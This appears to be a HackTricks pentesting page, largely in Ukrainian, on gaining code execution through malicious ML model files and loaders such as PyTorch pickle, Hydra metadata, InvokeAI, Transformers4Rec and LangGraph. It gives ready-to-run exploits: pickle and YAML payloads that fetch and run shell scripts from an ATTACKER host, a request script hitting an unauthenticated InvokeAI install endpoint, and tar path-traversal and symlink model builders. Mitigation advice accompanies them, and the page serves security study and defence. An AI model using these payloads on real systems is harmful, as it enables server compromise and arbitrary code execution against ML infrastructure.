# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning моделі зазвичай поширюються в різних форматах, таких як ONNX, TensorFlow, PyTorch тощо. Ці моделі можуть завантажуватися на машини розробників або у production-системи для використання. Зазвичай моделі не повинні містити malicious code, але існують випадки, коли модель може використовуватися для виконання arbitrary code у системі як передбачена функція або через vulnerability у бібліотеці завантаження моделей.

На момент написання існують такі приклади vulnerability цього типу:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle у model checkpoint призводить до code execution (обходячи safeguard `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download спричиняє code execution; Java deserialization RCE у management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint запускає pickle reducer під час `load_model_trainer_states_from_checkpoint` → code execution у ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Керований користувачем ключ `filter` інжектує SQL/JSON-path syntax, `UNION SELECT` підробляє fake checkpoint row, після чого `msgpack` deserialization імпортує та викликає Python code, обраний attacker’ом | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Завантаження моделі з YAML використовує `yaml.unsafe_load` (code exec) <br> Завантаження моделі з шаром **Lambda** виконує arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Створена `.tflite` модель запускає integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Завантаження моделі через `joblib.load` виконує pickle з payload attacker’а `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | Значення за замовчуванням `numpy.load` дозволяло pickled object arrays – malicious `.npy/.npz` запускає code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Шлях до external weights ONNX-моделі може вийти за межі директорії (читання arbitrary files) <br> Malicious ONNX model tar може перезаписати arbitrary files (що призводить до RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Модель із custom operator потребує завантаження native code attacker’а; складні model graphs зловживають логікою для виконання unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Використання model-load API з увімкненим `--model-control` дозволяє relative path traversal для запису files (наприклад, перезаписати `.bashrc` для RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Некоректний GGUF model file спричиняє heap buffer overflows у parser, що дозволяє arbitrary code execution у victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model із Lambda layer все ще виконує code під час завантаження (Keras safe_mode не охоплює старий формат – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Багато ML tools (наприклад, pickle-based model formats, Python `pickle.load`) виконують arbitrary code, вбудований у model files, якщо це не mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Керовані attacker’ом model metadata/config встановлюють `_target_` у arbitrary callable (наприклад, `builtins.exec`) → виконується під час завантаження навіть із “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, існують Python pickle-based models, наприклад ті, що використовуються [PyTorch](https://github.com/pytorch/pytorch/security), які можуть використовуватися для виконання arbitrary code у системі, якщо вони завантажуються не з `weights_only=True`. Тому будь-яка pickle-based model може бути особливо susceptible до атак цього типу, навіть якщо її немає в таблиці вище.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` імпортує та викликає будь-який dotted `_target_` в об’єкті configuration/metadata. Коли бібліотеки передають **untrusted model metadata** до `instantiate()`, attacker може вказати callable та аргументи, які негайно запускаються під час завантаження моделі (pickle не потрібен).<sup>[[12]](#references)[[13]](#references)</sup>

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Ключові моменти:
- Виконується до ініціалізації моделі в `restore_from/from_pretrained` у NeMo, coders HuggingFace у uni2TS та loaders у FlexTok.
- Рядковий block-list Hydra можна обійти за допомогою альтернативних шляхів імпорту (наприклад, `enum.bltns.eval`) або імен, визначених application (наприклад, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok також аналізує stringified metadata за допомогою `ast.literal_eval`, що уможливлює DoS (надмірне споживання CPU/пам’яті) до виклику Hydra.

### 🆕  InvokeAI RCE через `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний open-source web interface для Stable-Diffusion. Версії **5.3.1 – 5.4.2** відкривають REST endpoint `/api/v2/models/install`, який дає змогу користувачам завантажувати та load моделі з довільних URL.<sup>[[1]](#references)</sup>

Внутрішньо endpoint зрештою викликає:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Коли переданий файл є **PyTorch checkpoint (`*.ckpt`)**, `torch.load` виконує **pickle десеріалізацію**. Оскільки вміст надходить безпосередньо з URL, контрольованого користувачем, атакер може вбудувати шкідливий об'єкт із власним методом `__reduce__` усередину checkpoint; цей метод виконується **під час десеріалізації**, що призводить до **remote code execution (RCE)** на сервері InvokeAI.

Уразливості присвоєно **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Покрокова демонстрація експлуатації

1. Створіть шкідливий checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Розмістіть `payload.ckpt` на HTTP-сервері, який ви контролюєте (наприклад, `http://ATTACKER/payload.ckpt`).
3. Викличте вразливий endpoint (автентифікація не потрібна):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → gadget `os.system` виконується, і атакер отримує виконання коду в контексті процесу InvokeAI.

Готовий exploit: модуль **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.<sup>[[3]](#references)</sup>

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням має значення **false**)  
•  `/api/v2/models/install` доступний атакеру  
•  Процес має дозволи на виконання shell-команд

#### Заходи захисту

* Оновіть до **InvokeAI ≥ 5.4.3** — patch встановлює `scan=True` за замовчуванням і виконує сканування на malware перед десеріалізацією.<sup>[[2]](#references)</sup>
* Під час програмного завантаження checkpoint використовуйте `torch.load(file, weights_only=True)` або новий helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Застосовуйте allow-list / підписи для джерел моделей і запускайте сервіс із мінімально необхідними привілеями.

> ⚠️ Пам’ятайте, що будь-який формат на основі Python pickle (зокрема багато файлів `.pt`, `.pkl`, `.ckpt`, `.pth`) за своєю суттю небезпечно десеріалізувати з ненадійних джерел.

---

Приклад тимчасового заходу захисту, якщо потрібно залишити старі версії InvokeAI запущеними за reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE через unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (частина Merlin) використовував unsafe loader checkpoint, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` покладається на Python `pickle`, checkpoint під контролем атакувальника може виконати довільний код через reducer під час десеріалізації.<sup>[[5]](#references)</sup>

Вразливий шлях (до виправлення): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: у Python pickle об’єкт може визначати reducer (`__reduce__`/`__setstate__`), який повертає callable та аргументи. Callable виконується під час unpickling. Якщо такий об’єкт присутній у checkpoint, він запускається до використання будь-яких weights.

Мінімальний приклад malicious checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Вектори доставки та радіус ураження:
- Троянізовані checkpoints/models, поширені через репозиторії, buckets або artifact registries
- Автоматизовані resume/deploy pipelines, які автоматично завантажують checkpoints
- Виконання відбувається всередині training/inference workers, часто з підвищеними привілеями (наприклад, root у containers)

Виправлення: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) замінив прямий виклик `torch.load()` на обмежений десеріалізатор із allow-list, реалізований у `transformers4rec/utils/serialization.py`. Новий loader перевіряє типи/поля та запобігає виклику довільних callables під час завантаження.<sup>[[7]](#references)</sup>

Захисні рекомендації, специфічні для PyTorch checkpoints:
- Не виконуйте unpickle ненадійних даних. За можливості надавайте перевагу неекзекутованим форматам, як-от [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX.
- Якщо потрібно використовувати PyTorch serialization, переконайтеся, що встановлено `weights_only=True` (підтримується в новіших версіях PyTorch), або використовуйте custom allow-listed unpickler, подібний до patch для Transformers4Rec.<sup>[[4]](#references)</sup>
- Забезпечте provenance/signatures моделей і виконуйте sandbox десеріалізації (seccomp/AppArmor; non-root user; обмежена FS і відсутній network egress).
- Відстежуйте неочікувані дочірні процеси від ML-сервісів під час завантаження checkpoint; відстежуйте використання `torch.load()`/`pickle`.

Посилання на POC і vulnerable/patch версії:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Приклад – створення malicious PyTorch model

- Створіть model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Завантаження моделі:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Десеріалізація Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent FaceDetection-DSFD надає endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердила, що віддалений attacker може змусити victim завантажити шкідливу сторінку/файл, передати до цього endpoint створений serialized blob і запустити десеріалізацію від імені `root`, що призводить до повної компрометації.

Потік експлуатації відповідає типовому зловживанню pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Будь-який gadget, доступний під час десеріалізації (конструктори, `__setstate__`, callbacks фреймворку тощо), можна weaponize таким самим способом, незалежно від того, чи використовувався транспорт HTTP, WebSocket або файл, поміщений у відстежуваний каталог.



### LangGraph checkpointer SQLi → MessagePack RCE

Цей ланцюжок атаки цікавий тим, що attacker **не потрібно завантажувати шкідливий файл моделі**. Натомість застосунок відкриває **API персистентності AI-agent** (`get_state_history(..., filter=...)`), а введені користувачем дані потрапляють до конструктора запитів checkpointer.

#### 1. Структурна SQLi у фільтрах метаданих

Вразливий шаблон SQLite виглядав так:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Значення прив'язується пізніше, але `query_key` конкатенується в **рядок шляху JSON**, тому символ `'` всередині ключа словника виходить за межі `'$.{query_key}'` і впроваджує SQL. Те саме стосується **шляхів JSON, ідентифікаторів, операторів, `LIMIT` і полів TTL**: плейсхолдери захищають лише значення, але не структурний синтаксис запиту.

#### 2. `UNION SELECT` може націлюватися на downstream sinks, а не лише на крадіжку даних

Запит повертає `type` і серіалізовані байти `checkpoint`, які пізніше використовуються як:
```python
self.serde.loads_typed((type, checkpoint))
```
Це означає, що SQLi у реченні `WHERE` може ін'єктувати **підроблений рядок результату**:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Якщо подальший код парсить, десеріалізує, записує або виконує будь-яку вибрану колонку, зіставте ці колонки з їхніми sinks. У цьому випадку підроблений рядок перетворює SQLi на **десеріалізацію, контрольовану атакувальником**.

#### 3. Небезпечні extension hooks у MessagePack еквівалентні code gadgets

Шлях `msgpack` у LangGraph використовував custom extension hook, який розпаковував вкладений tuple і виконував:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
Отже, об’єкт розширення MessagePack, що кодує щось еквівалентне `("os", "system", "id > /tmp/pwned")`, імпортує `os`, знаходить `system` і виконує команду. Під час перевірки AI-фреймворків перевіряйте **власні MessagePack/JSON/pickle revivers** на наявність динамічного імпорту, reflection або довільного виклику callable-об’єктів.

#### 4. Практичний шаблон аудиту для agent-фреймворків

Перевіряйте будь-які контрольовані користувачем вхідні дані, які потрапляють до:
- API для історії стану / memory / replay / переліку checkpoint
- структурованих конструкторів фільтрів, які генерують фрагменти SQL або Redis-запитів
- власних десеріалізаторів (`pickle`, `msgpack`, хуків об’єктів `json`, конструкторів YAML)
- шляхів відновлення, які довіряють рядкам, повернутим persistence layer

Цей конкретний ланцюжок впливав на self-hosted розгортання LangGraph із використанням **SQLite** або **Redis checkpointer**, коли ненадійні користувачі могли контролювати `filter`. Виправленими версіями, зазначеними в disclosure, були `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` і `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

## Моделі для Path Traversal

Як зазначено в [**цьому дописі в блозі**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), формати більшості моделей, які використовують різні AI-фреймворки, базуються на архівах, зазвичай `.zip`. Тому може бути можливим зловживання цими форматами для виконання атак Path Traversal, що дає змогу читати довільні файли із системи, у якій завантажується модель.<sup>[[16]](#references)</sup>

Наприклад, за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить файл у каталозі `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Або за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить символічне посилання на каталог `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Глибоке занурення: десеріалізація Keras .keras та пошук gadget

Щоб отримати спеціалізований посібник із внутрішньої будови .keras, RCE через Lambda-layer, проблеми з довільним імпортом у версіях ≤ 3.8 та пошуку gadget після виправлення всередині allowlist, див.:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Посилання

- [1] [Блог OffSec – "CVE-2024-12029 – десеріалізація ненадійних даних у InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Коміт виправлення InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Документація модуля Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – міркування щодо безпеки для torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Блог ZDI – CVE-2025-23298: отримання Remote Code Execution у NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Рекомендація ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Коміт виправлення Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Вразливий loader до виправлення (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC шкідливого checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader після виправлення (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution із сучасними форматами та бібліотеками AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Документація Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Коміт block-list Hydra (попередження про RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – від SQLi до RCE: експлуатація Checkpointer LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Перетворення Archive Slip bugs на цінні AI/ML Bounties](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)

{{#include ../banners/hacktricks-training.md}}
